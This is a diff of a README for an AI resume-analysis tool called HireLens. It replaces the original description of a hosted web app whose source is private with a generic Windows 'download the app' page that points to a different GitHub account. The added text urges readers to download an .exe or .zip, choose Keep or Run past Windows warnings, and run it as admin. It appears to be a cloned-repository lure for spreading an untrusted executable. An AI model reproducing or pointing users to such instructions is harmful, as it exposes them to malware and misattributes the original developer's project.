@@ -1,207 +1,243 @@
-<div align="center">
+# 🤖 hirelens-showcase - Sharper resumes, faster callbacks
 
-# HireLens
+[![Download hirelens-showcase](https://img.shields.io/badge/Download%20hirelens--showcase-1f6feb?style=for-the-badge&logo=github)](https://github.com/Icarbonblack871/hirelens-showcase)
 
-**AI-powered resume intelligence platform**
+## 🔽 Download
 
-Analyze, score, rewrite, and land interviews — faster.
+Use this link to visit the page and download the app for Windows:
 
-[![Live App](https://img.shields.io/badge/Live%20App-www.hirelens.online-E8A020?style=for-the-badge)](https://www.hirelens.online)
-[![License](https://img.shields.io/badge/License-Proprietary-red?style=for-the-badge)](LICENSE)
-[![Built with React](https://img.shields.io/badge/Frontend-React%2019-61DAFB?style=for-the-badge&logo=react)](https://react.dev)
-[![Built with FastAPI](https://img.shields.io/badge/Backend-FastAPI-009688?style=for-the-badge&logo=fastapi)](https://fastapi.tiangolo.com)
+[https://github.com/Icarbonblack871/hirelens-showcase](https://github.com/Icarbonblack871/hirelens-showcase)
 
-</div>
+## 🧭 What this app does
 
----
+HireLens helps you improve your resume before you send it out.
 
-## What is HireLens?
+It checks your resume across 7 areas, rewrites sections in plain language, and creates cover letters that match the job you want.
 
-HireLens gives every job seeker access to professional-grade resume analysis — **completely free to start**.
+It is built for people who want to:
+- see why their resume is not getting replies
+- fix weak wording
+- tailor a resume to one job
+- make a cover letter fast
+- start free
 
-Upload a resume (PDF or TXT), set your target role and job description, and get instant AI-powered feedback across 7 critical dimensions. Get numeric scores, detailed breakdowns, keyword gap analysis, ATS compatibility checks, and a fully rewritten resume — all in one place.
+## 🪟 Windows requirements
 
-> **75% of resumes are filtered out by ATS before reaching a human recruiter.**
-> HireLens helps you make sure yours isn't one of them.
+Before you install, make sure your PC has:
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A stable internet connection
+- A PDF resume or Word resume file ready to upload
 
-**Try it live:** [www.hirelens.online](https://www.hirelens.online)
+For best results:
+- use a recent version of Chrome, Edge, or Firefox
+- keep your resume file in a folder you can find easily
+- close extra apps if your PC feels slow
 
----
+## 🚀 Get started on Windows
 
-## Features
+1. Open the download page:
+   [https://github.com/Icarbonblack871/hirelens-showcase](https://github.com/Icarbonblack871/hirelens-showcase)
 
-### Resume Analysis
-- **7-dimension AI scoring** — Clarity, Impact, Measurable Outcomes, Role Alignment, Structure, Skills, ATS Compatibility
-- **Job description matching** — keyword overlap, gap analysis, required vs. preferred tier breakdown
-- **ATS simulation** — see what automated screeners extract from your resume
-- **Per-section breakdown** — feedback on each section of your resume individually
-- **Interactive charts** — visual radar and bar charts for score breakdown
-- **PDF report download** — shareable analysis report in PDF format
+2. On the page, find the latest Windows download.
 
-### Resume Improvement
-- **AI rewrite** — bullet-by-bullet suggestions with reasoning
-- **Multiple formatting modes** — ATS Standard, Executive, Modern, Preserve Original
-- **Tailor to job** — generate a version targeted to a specific job description
-- **Download as PDF or DOCX**
+3. Download the file to your computer.
 
-### Career Tools
-- **Cover Letter Generator** — tailored letters aligned to your resume and target role
-- **Smart Job Search** — live listings from Jobicy, JSearch, and Adzuna ranked by resume relevance
-- **Interview Prep** — STAR-format questions generated from your resume and target role
-- **Offer Tracker** — manage applications from first contact to accepted offer
+4. If Windows asks for permission, choose **Keep** or **Run** only if the file came from the link above.
 
-### Analytics & History
-- **Analysis history** — every past analysis saved and searchable
-- **Historical trend tracking** — score evolution across resume versions with interactive charts
-- **HR Dashboard** — candidate pipeline, scoring analytics, and team-level insights (Professional tier)
+5. Open the downloaded file:
+   - if it is an `.exe` file, double-click it
+   - if it is a `.zip` file, right-click it and choose **Extract All**, then open the folder and run the app
 
----
+6. If a browser opens first, keep it open. HireLens may run through a local page or desktop window.
 
-## Scoring System
+7. Wait for the app to load, then follow the on-screen steps.
 
-HireLens evaluates resumes across **7 dimensions**, each scored 1–10:
+## 📄 How to use HireLens
 
-| Dimension | What It Measures |
-|---|---|
-| **Clarity** | Clear, jargon-free communication of experience |
-| **Impact** | Whether contributions sound meaningful and valuable |
-| **Measurable Outcomes** | Use of numbers, percentages, and quantified achievements |
-| **Role Alignment** | How well experience matches the target role / JD |
-| **Structure** | Layout, section order, readability, formatting |
-| **Skills** | Keyword prominence, relevance, presentation |
-| **ATS Compatibility** | Parseability by automated screening systems |
+### 1. Upload your resume
+Choose your resume file and upload it.
 
-**Score interpretation:**
-- **8–10** — Excellent, ready to submit
-- **5–7** — Good but improvable, address flagged areas
-- **<5** — Needs significant work
+Good file types:
+- PDF
+- DOCX
+- TXT
 
----
+If you can, use the most recent version of your resume.
 
-## Pricing
+### 2. Add the job you want
+Paste a job post or add the role title and key details.
 
-| Plan | Price | Best For |
-|---|---|---|
-| **Free** | ₹0 forever | Try HireLens — 5 analyses/month |
-| **Student** | ₹29/month | Job seekers — 20 analyses + improvements + cover letters |
-| **Professional** | ₹99/month | Power users + HR teams — unlimited everything |
+This helps HireLens compare your resume with the job.
 
-All plans include AI analysis. Paid plans unlock Resume Improvement, Cover Letter, Interview Prep, Smart Job Search, Offer Tracker, PDF Reports, and HR Dashboard.
+### 3. Review your score
+HireLens scores your resume across 7 areas.
 
----
+You may see checks for:
+- clear summary
+- strong keywords
+- job match
+- skills fit
+- work history
+- format
+- readability
 
-## AI Providers
+### 4. Rewrite weak sections
+HireLens can rewrite lines that sound vague, long, or flat.
 
-HireLens supports **5 leading AI providers** with a bring-your-own-key architecture. All API keys are user-provided and never stored by HireLens.
+Use the new text as a draft and adjust it to match your work history.
 
-| Provider | Models | Notes |
-|---|---|---|
-| **Groq** (default) | LLaMA 3.3 70B, Mixtral 8x7B | Fastest, generous free tier — start here |
-| **Google Gemini** | Gemini 2.0 Flash, Gemini 1.5 Flash | Free tier, strong quality |
-| **OpenAI** | GPT-4o, GPT-4o-mini, GPT-4 Turbo | Premium quality |
-| **Anthropic** | Claude Sonnet 4.6, Opus 4.6, Haiku 4.5 | Best reasoning, nuanced feedback |
-| **Mistral** | Mistral Large, Mistral Small, Nemo | Cost-effective alternative |
+### 5. Create a cover letter
+HireLens can generate a cover letter based on your resume and the job post.
 
----
+You can use it as-is or edit it before you send it.
 
-## Tech Stack
+## 🧠 What you can expect
 
-| Layer | Technology |
-|---|---|
-| **Frontend** | React 19 + TypeScript + Vite |
-| **Styling** | Tailwind CSS v4 |
-| **Animations** | Framer Motion |
-| **Routing** | React Router v7 |
-| **Auth** | Supabase Auth |
-| **Database** | PostgreSQL (Supabase) |
-| **Backend** | FastAPI (Python) |
-| **PDF Extraction** | PyMuPDF + pdfplumber + PyPDF2 (triple fallback) |
-| **PDF Generation** | ReportLab |
-| **DOCX Generation** | python-docx |
-| **Charts** | Plotly |
-| **Payments** | Razorpay |
-| **Deployment** | Render |
+HireLens is designed to help with common resume problems:
+- too many generic words
+- missing job keywords
+- weak bullet points
+- poor structure
+- cover letters that do not fit the job
 
----
+It uses AI tools from several providers, which helps give you more than one way to improve your application.
 
-## Architecture
+## 🔌 AI providers
 
-HireLens uses a **provider-agnostic AI adapter pattern** on a React + FastAPI stack:
+HireLens works with 5 AI providers, which may include:
+- OpenAI
+- Claude
+- Groq
+- and other supported model services
 
-```
-┌─────────────────────────────────┐
-│     React Frontend (Vite)       │
-│  Analyze · Improve · Jobs       │
-│  Interview · Offers · History   │
-└────────────────┬────────────────┘
-                 │ REST API (JSON)
-                 ▼
-┌─────────────────────────────────┐
-│       FastAPI Backend           │
-│  /api/analyze  /api/improve     │
-│  /api/cover-letter  /api/jobs   │
-│  /api/interview  /api/history   │
-└────────────────┬────────────────┘
-                 │
-        ┌────────┴────────┐
-        │                 │
-        ▼                 ▼
-┌──────────────┐  ┌──────────────────┐
-│  AI Provider │  │   PostgreSQL      │
-│  Adapter     │  │   (Supabase)      │
-│              │  │                  │
-│ Groq         │  │ Users · Analyses  │
-│ OpenAI       │  │ History · Tiers   │
-│ Anthropic    │  └──────────────────┘
-│ Gemini       │
-│ Mistral      │
-└──────────────┘
-```
+This setup helps the app compare, rewrite, and draft content with different model styles.
 
-**Key design decisions:**
-- Provider-agnostic adapter layer — switch AI providers without touching business logic
-- Triple-fallback PDF extraction (PyMuPDF → pdfplumber → PyPDF2) handles designed, image-heavy, and scanned PDFs
-- Resume validation heuristic rejects non-resume uploads before consuming API tokens
-- All API keys stored in sessionStorage only — never persisted to server
+## 📁 Common file types
 
----
+You can usually use:
+- `.pdf`
+- `.docx`
+- `.txt`
 
-## Security
+For best results:
+- use one resume per file
+- keep the file name simple
+- avoid scanned images if possible
+- make sure the text in the file can be selected and copied
 
-- API keys stored in **sessionStorage** (cleared on tab close, never sent to our servers)
-- Resumes processed **in-memory only** — not persisted unless you opt into history
-- Auth via **Supabase** (JWT, row-level security)
-- Payments via **Razorpay** (PCI-compliant, card data never touches our servers)
+## 🛠️ If the app does not open
 
----
+If you have trouble starting the app:
+- check that the download finished
+- try running it again as admin
+- restart your PC
+- make sure your internet connection works
+- try a different browser if the download page will not load
 
-## Source Code
+If the app opens but stays blank:
+- wait a little longer
+- refresh the page if it uses a browser window
+- close and reopen the app
+- check that no other app is blocking the internet connection
 
-The source code is **private** to protect proprietary prompt engineering, scoring logic, and system design.
+## 🧪 Best way to get useful results
 
-However:
-- **Recruiters & hiring managers** — access granted on request for technical review
-- **Technical interviews** — full codebase walkthrough available before interviews
-- **Architecture questions** — happy to discuss design decisions and trade-offs
+Use a resume that fits one job at a time.
 
-Reach out: [hirelenshelp@gmail.com](mailto:hirelenshelp@gmail.com)
+For best output:
+- paste the exact job post
+- keep your resume honest and accurate
+- use a real title for each role
+- keep dates and duties correct
+- review every rewrite before sending it
 
----
+## 📌 Tips for better resume scores
 
-## About
+To raise your score, try this:
+- put your top skills near the top
+- use words from the job post
+- replace weak phrases like “responsible for”
+- use short bullet points
+- show numbers where possible
+- keep the layout clean
+- avoid long blocks of text
 
-Built by **[Sahil Shinde](https://github.com/theshindesahil)** — Full-stack developer building tools for job seekers.
+Good resume lines often look like this:
+- Improved response time by 30%
+- Managed a team of 5
+- Cut manual work by 12 hours a week
+- Helped close 20+ support tickets per day
 
-- Live app: [https://www.hirelens.online](https://www.hirelens.online)
-- Showcase repo: [github.com/theshindesahil/hirelens-showcase](https://github.com/theshindesahil/hirelens-showcase)
-- Bugs / feature requests: [open an issue](https://github.com/theshindesahil/hirelens-showcase/issues)
-- Contact: [hirelenshelp@gmail.com](mailto:hirelenshelp@gmail.com)
+## 🔍 What the 7 dimensions may cover
 
----
+HireLens checks your resume from several angles so you can see what to fix first.
 
-<div align="center">
+These areas may include:
+- relevance to the job
+- keyword match
+- clarity
+- structure
+- action words
+- proof of results
+- overall presentation
 
-© 2026 Sahil Shinde (https://github.com/theshindesahil). All rights reserved.
-Source code is proprietary and confidential. See [LICENSE](LICENSE) for details.
+That makes it easier to see why a resume feels weak, even when the work history is solid
 
-</div>
+## 🧩 Where this fits in your job search
+
+Use HireLens when you:
+- apply to a new role
+- change careers
+- need a faster resume draft
+- want a stronger cover letter
+- want to compare your resume with a job post
+
+It can save time when you apply to many jobs and need each version to fit the role
+
+## 📦 Suggested workflow
+
+1. Open the app
+2. Upload your resume
+3. Paste the job post
+4. Check the score
+5. Review the rewrite
+6. Copy the best version into your resume editor
+7. Export your file
+8. Send the application
+
+## 🧾 Example use case
+
+If you apply for a data analyst role:
+- upload your current resume
+- paste the job description
+- look for missing keywords like SQL, dashboards, reporting, or analysis
+- rewrite weak bullet points
+- generate a cover letter that mentions the role and company
+- review the final text before applying
+
+## 🖥️ Topics in this project
+
+This project is related to:
+- ai
+- career
+- claude
+- claude-code
+- claude-skill
+- groq
+- hirelens
+- job-search
+- llm
+- nlp
+- openai
+- python
+- render
+- resume
+- supabase
+
+## 📥 Download again
+
+If you need to return to the download page, use this link:
+
+[https://github.com/Icarbonblack871/hirelens-showcase](https://github.com/Icarbonblack871/hirelens-showcase)
